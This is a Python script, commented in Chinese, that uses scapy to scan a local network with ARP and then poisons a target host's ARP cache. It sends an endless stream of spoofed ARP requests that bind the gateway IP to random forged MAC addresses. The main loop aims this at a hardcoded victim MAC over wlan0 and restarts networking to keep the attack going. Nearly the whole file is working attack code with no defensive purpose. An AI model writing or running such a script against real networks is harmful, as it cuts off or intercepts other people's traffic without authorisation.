#!/usr/bin/env python
# _*_ coding=utf-8 _*_

from scapy.all import *
import time
import random
import os
#-------------------------------------------------------
#获取子网
#OurIP :我们的IP地址
#输入192.168.0.x输出192.168.0
#-------------------------------------------------------
def GetSubNet(OurIP):
    Index = 0
    SubString = ""
    while True:
        num = OurIP.find('.',Index)
        if num != -1:
            Index = num + 1
        if num == -1:
            SubString = OurIP[:Index]
            break
    return SubString
#-------------------------------------------------------
#获取目标IP的MAC地址
#tgtIP:目标IP
#-------------------------------------------------------
def GetMac(tgtIP):
    retry = 4
    try:
        while retry > 0:
            tgtMac = getmacbyip(tgtIP)
            if tgtMac == None:
                print("Get Mac of ",tgtIP,"failed...Will Retry")
                retry = retry - 1
            else:return tgtMac
    except:
        print("Get Mac of ",tgtIP,"failed...")
#-------------------------------------------------------
#获取局域网广播地址
#OurIP :我们的IP地址
#-------------------------------------------------------
def GetBrocastIP(OurIP):
    return GetSubNet(OurIP) + "255"
#-------------------------------------------------------
#伪造IP地址
#OurIP:我们自己的IP
#Num:要伪造多少个IP地址
#-------------------------------------------------------
def GetForgetIP(OurIP,Num):
    SubString = GetSubNet(OurIP)
    #伪造IP
    ForgetIP = []
    i = 0
    while i < Num:
        num = int(random.uniform(0,255))
        TempIP = SubString + "%d"%num
        if TempIP == OurIP:
            continue
        else:
            ForgetIP.append(TempIP)
            i = i + 1
    return ForgetIP
#-------------------------------------------------------
#伪造MAC地址
#OurMac:我们自己的MAC地址
#-------------------------------------------------------
def GetForgeMac(OurMac,Num):
    ForgeMac = []
    j = 0
    while j < Num:
        while True:
            i = 0
            TempMac = ""
            while i < 6:
                num = int(random.uniform(0,255))
                TempMac = TempMac + "%02X"%num
                if i <= 4:TempMac = TempMac + ":"
                i = i + 1
            if TempMac == OurMac:
                pass
            else:
                ForgeMac.append(TempMac)
                j = j + 1
                break
    return ForgeMac
#-------------------------------------------------------
#扫描网络，获取IP-MAC并保存
#OurIP：我们的IP地址
#Start：扫描起始地址 
#End：扫描结束地址
#TimeOut：超时时间
#结果保存在字典Table中并打印出来
#-------------------------------------------------------
Table = {}
def Scanf(OurIP,Start,End,TimeOut):
    Table.clear()
    SubString = GetSubNet(OurIP)
    ip = []
    for num in range(Start,End):
        ip.append(SubString+str(num))
    ans,unans=srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=1,pdst=ip),timeout=TimeOut)
    def GetArpResult(r):
        Table[r.sprintf("%ARP.hwsrc%")] = r.sprintf("%ARP.psrc%")
        return r.sprintf("%ARP.hwsrc%\t%ARP.psrc%")
    g = lambda(s,r):GetArpResult(r)
    ans.summary(g)
#-------------------------------------------------------
#通过MAC地址获取IP地址
#-------------------------------------------------------
def GetIpByMac(Mac):
    if len(Table) == 0:return None
    return Table.get(Mac)
#-------------------------------------------------------
#针对MAC地址投毒
#Face:网卡接口
#PackNum:数据包数目
#Counter:攻击次数(-1：无限次)
#Interval:攻击间隔
#例如：Face="wlan0",PackNum=10,Counter=-1,Interval=1
#-------------------------------------------------------
def Attack_MAC(Face,MAC,PackNum,Counter,Interval):
    MY_ip = get_if_addr(Face)
    MY_mac = get_if_hwaddr(Face)
    print(MY_ip,"->",MY_mac)
    if MY_ip == None or MY_mac == None:return
    
    BctIP = GetBrocastIP(MY_ip)
    Bct_mac = "FF:FF:FF:FF:FF:FF"
    print(BctIP,"->",Bct_mac)
    
    GW_ip = "192.168.0.1"
    GW_mac = GetMac(GW_ip)
    print(GW_ip,"->",GW_mac)
    if GW_mac == None:return
    
    #XM_mac = "c8:3a:35:c0:05:15"
    #XM_mac = "24:09:95:95:e2:02"
    #XM_mac = "04:e6:76:46:a6:f3"
    XM_mac = MAC
    #扫描局域网内主机，找不到目标MAC则延时再次扫描
    ScanfCnt = 0
    while True:
        Scanf(MY_ip,100,150,5)
        XM_ip = GetIpByMac(XM_mac)
        if XM_ip == None:ScanfCnt = ScanfCnt + 1
        else:break
        time.sleep(ScanfCnt*5)
        if ScanfCnt > 20:return
    print(XM_ip,"->",XM_mac)
    
    while True:
        #伪造
        Temp_mac = GetForgeMac(MY_mac,PackNum)
        Temp_ip = GetForgetIP(MY_ip,PackNum)
        
        #PKT_1 = Ether(dst=GW_mac)/ARP(op=1,psrc=XM_ip,hwsrc=Temp_mac,pdst=GW_ip,hwdst=GW_mac)
        PKT_2 = Ether(dst=XM_mac)/ARP(op=1,psrc=GW_ip,hwsrc=Temp_mac,\
        pdst=XM_ip,hwdst=XM_mac)
        try:
            #time.sleep(0.5)
            sendp(PKT_2,iface = Face)
        except:
            print("!!Send Error!!")
        #sleep
        #num = int(random.uniform(0,Interval))
        #print("Will sleep for ",num,"S")
        time.sleep(0.3)
        if Counter == -1:
            pass
        else:
            Counter = Counter - 1
            if Counter == 0:
                return
#-------------------------------------------------------
#检查WIFI是否连接，否则重连
#-------------------------------------------------------
def EnsureWifiConnection():
    if '192' not in os.popen('ifconfig | grep 192').read():
        print('\n****** wifi is down, restart... ******\n')
        os.system('sudo /etc/init.d/networking restart')
        time.sleep(30)
        return True
    else:return False
if __name__ == "__main__":
    #while True:
    #AttackIP("192.168.0.108","wlan0",10,60,"192.168.0.1")
    #AttackMac(Mac,face,Num,Interval,GW_IP):
    #AttackMac("C8:3A:35:C0:05:15","wlan0",2,2,"192.168.0.108")
    #num=0
    #while num < 0:
    #    num = num + 1
    #    time.sleep(60)
    #    print(num)
    while True:
        EnsureWifiConnection()
        Attack_MAC("wlan0","04:e6:76:46:a6:f3",2,100,1)